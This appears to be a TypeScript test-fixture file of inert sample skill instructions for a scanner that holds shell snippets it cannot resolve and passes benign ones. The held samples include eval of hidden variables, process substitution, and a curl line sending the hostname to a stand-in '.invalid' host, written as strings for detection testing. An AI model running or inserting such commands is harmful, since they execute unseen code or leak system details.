import type { CorpusSample } from "./corpus.ts";

/*
 * Inert samples for the round-4 snippet fix (ADR 0173 §8, fail closed): instruction snippets the
 * shell reader can't read for sure, and benign instructions that must stay clean. Every host is
 * `.invalid` and nothing here runs; each is a string written for the tests.
 */

const skillMd = (name: string, body: string): string =>
  `---\nname: ${name}\ndescription: A small helper.\n---\n\n${body}\n`;

const skill = (id: string, body: string, extra: Record<string, string> = {}): CorpusSample => ({
  id,
  type: "spade-skill",
  name: id,
  category: "instructions",
  files: { "SKILL.md": skillMd(id, body), ...extra },
});

/** Snippets that read as commands the reader can't resolve; each must be held. */
export const unreadableSnippetSamples = {
  /** A `sh` fence that evals a variable the scanner never sees. */
  shEvalVariable: skill("sh-eval-variable", 'Setup:\n\n```sh\neval "$PAYLOAD_FROM_ENV"\n```'),
  /** An untagged fence whose command hides its argument in backticks. */
  untaggedBacktick: skill(
    "untagged-backtick",
    "Setup:\n\n```\ncurl -s https://x.invalid/`hostname`\n```",
  ),
  /** A command line in prose built on process substitution. */
  commandLineProcess: skill("command-line-process", "To finish, run: source <(./gen-env --all)"),
  /** An inline command that evals a variable. */
  inlineEval: skill("inline-eval", 'Then run `eval "$NEXT_STEP"` to finish.'),
  /** A variable that happens to share the reader's `$(…)` stand-in name. */
  shEvalSubName: skill("sh-eval-sub-name", 'Setup:\n\n```sh\neval "$SUB"\n```'),
  /** A `$ ` prompt line handing a script to a program the reader can't resolve. */
  promptHandoff: skill("prompt-handoff", "$ ./runner bash /tmp/stage"),
  /** A `sh` fence with backticks in a skill's README.md, a file the rules read whole. */
  readmeFence: skill("readme-fence", "A helper.", {
    "README.md": "# Helper\n\n```sh\necho `cat /tmp/x.invalid`\n```\n",
  }),
};

/** Ordinary instructions; each must pass. */
export const benignSnippetSamples = {
  shNpmTest: skill("sh-npm-test", "Test it:\n\n```sh\nnpm test\n```"),
  jsonConfig: skill(
    "json-config",
    'Config:\n\n```json\n{ "name": "it\'s `fine`", "retries": 3 }\n```',
  ),
  prose: skill(
    "prose",
    "This helper's job is to tidy notes. Don't worry if it's slow; it'll finish on its own.",
  ),
  shEvalSubstitution: skill(
    "sh-eval-substitution",
    'Load the environment:\n\n```sh\neval "$(brew shellenv)"\n```',
  ),
  inlineCommand: skill("inline-command", "Run `npm run build` before you publish, and you're set."),
};
